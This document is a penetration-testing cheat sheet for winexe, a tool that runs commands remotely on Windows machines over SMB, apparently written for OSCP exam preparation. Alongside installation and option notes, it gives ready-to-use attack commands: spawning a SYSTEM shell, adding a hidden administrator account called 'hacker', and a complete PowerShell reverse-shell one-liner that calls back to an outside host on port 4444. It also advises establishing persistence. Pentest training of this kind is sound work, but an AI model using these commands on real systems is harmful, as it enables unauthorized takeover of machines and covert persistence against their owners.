# Winexe - Remote Windows Command Execution

Winexe is a powerful tool that allows you to execute commands on Windows systems remotely from a Linux machine. It uses the SMB protocol and functions similarly to PsExec in Windows environments.

## Installation

```bash
# On Kali Linux
sudo apt-get update
sudo apt-get install winexe

# If not available in repositories, build from source:
git clone https://github.com/skalkoto/winexe.git
cd winexe/source
./waf configure
./waf build
sudo cp build/winexe /usr/local/bin/
```

## Basic Usage

```bash
# Basic syntax
winexe [options] //IP_ADDRESS 'command'

# Execute command as current user
winexe -U 'DOMAIN/username%password' //192.168.1.10 'ipconfig'

# Execute command as another user
winexe -U 'DOMAIN/username%password' --runas='DOMAIN/otheruser%otherpassword' //192.168.1.10 'ipconfig'

# Execute command with SYSTEM privileges
winexe -U 'DOMAIN/username%password' --system //192.168.1.10 'ipconfig'

# Execute interactive command prompt
winexe -U 'DOMAIN/username%password' //192.168.1.10 'cmd.exe'
```

## Key Options

- `-U`: Specify credentials in the format 'DOMAIN/username%password'
- `--system`: Run the command with SYSTEM privileges
- `--runas`: Run the command as a different user
- `--interactive=0|1`: Enable or disable interactive mode
- `--uninstall`: Uninstall the winexe service after execution
- `-d, --debuglevel=DEBUGLEVEL`: Set debug level (default: 0)
- `-C, --codepage=CODEPAGE`: Set codepage for DOS applications (default: 0)

## Examples for Penetration Testing

### Get SYSTEM Shell

```bash
# Get a SYSTEM shell
winexe -U 'administrator%password123' --system //192.168.1.10 'cmd.exe'
```

### Add a New Administrator User

```bash
# Create a new user and add to Administrators group
winexe -U 'administrator%password123' --system //192.168.1.10 'net user hacker Password123! /add && net localgroup administrators hacker /add'
```

### Execute PowerShell Commands

```bash
# Run PowerShell command
winexe -U 'administrator%password123' --system //192.168.1.10 'powershell -command "Get-Service | Where-Object {$_.Status -eq \"Running\"}"'
```

### Establish Reverse Shell

```bash
# Download and execute reverse shell using PowerShell
winexe -U 'administrator%password123' --system //192.168.1.10 'powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient(\"192.168.1.5\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'
```

## Advantages for OSCP

- Execute commands remotely without installing additional software on the target
- Gain SYSTEM privileges directly when you have admin credentials
- Perform tasks like adding users, changing settings, or executing scripts without RDP
- Works well in environments where PowerShell might be restricted
- Run commands silently without user awareness

## Limitations

- Requires valid credentials with appropriate permissions
- Leaves logs on the target system
- May be blocked by firewalls or strict security policies
- Requires SMB port (445) to be accessible

## Alternatives

- **Impacket's psexec.py**: Python implementation with similar functionality
- **Metasploit's psexec module**: Similar functionality with more attack options
- **CrackMapExec**: Includes similar features as part of its toolkit
- **Evil-WinRM**: Better for PowerShell remote management when WinRM is available

## OSCP Exam Tips

For the OSCP exam:
1. Use winexe to quickly establish command execution after obtaining valid credentials
2. Remember the `--system` flag to gain SYSTEM privileges immediately
3. Practice running different types of commands, especially those that establish persistence
4. Be aware that winexe creates a service on the target that may be logged or detected 